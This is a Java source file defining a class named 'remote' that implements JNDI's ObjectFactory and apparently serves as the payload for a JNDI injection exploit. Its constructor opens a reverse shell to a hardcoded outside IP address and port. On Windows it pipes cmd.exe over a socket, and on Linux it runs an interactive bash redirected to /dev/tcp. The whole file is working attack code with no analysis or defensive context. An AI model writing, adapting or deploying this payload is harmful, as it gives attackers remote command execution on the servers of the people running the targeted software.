import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.Serializable;
import java.util.Hashtable;

public class remote implements ObjectFactory, Serializable {

    public remote() {
        try{
            // System.out.println(System.getProperty("os.name").toLowerCase());
            if(System.getProperty("os.name").toLowerCase().contains("win")){
                String host="106.225.138.9";
                int port=10011;
                String cmd="cmd.exe";
                Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
                java.net.Socket s=new java.net.Socket(host,port);
                java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
                java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream();
                while(!s.isClosed()) {
                    while(pi.available()>0) {
                        so.write(pi.read());
                    }
                    while(pe.available()>0) {
                        so.write(pe.read());
                    }
                    while(si.available()>0) {
                        po.write(si.read());
                    }
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    }
                    catch (Exception e){
                    }
                };
                p.destroy();
                s.close();
            }else if(System.getProperty("os.name").toLowerCase().contains("linux")){
                java.lang.Runtime.getRuntime().exec(new String[]{"bash","-c","exec bash -i &>/dev/tcp/106.225.138.9/10011 <&1"});
            }else{
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}